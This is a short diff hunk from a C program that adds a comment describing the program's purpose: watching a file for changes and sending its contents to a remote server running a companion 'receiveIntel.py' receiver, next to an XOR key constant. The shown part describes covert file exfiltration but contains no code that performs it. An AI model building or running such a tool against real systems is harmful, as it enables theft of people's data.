@@ -10,6 +10,11 @@
 #define MAX_BUF_SIZE 1024
 const char* xorKey = "bobbyb";
 
+/**
+ * @brief This program will monitor a file for changes and send the contents of the file to a remote
+ * server. You must start the accompanying receiveIntel.py program on the remote server before running
+ */
+
 int main() {
     /**
      * @brief CHANGE THESE VARIABLES
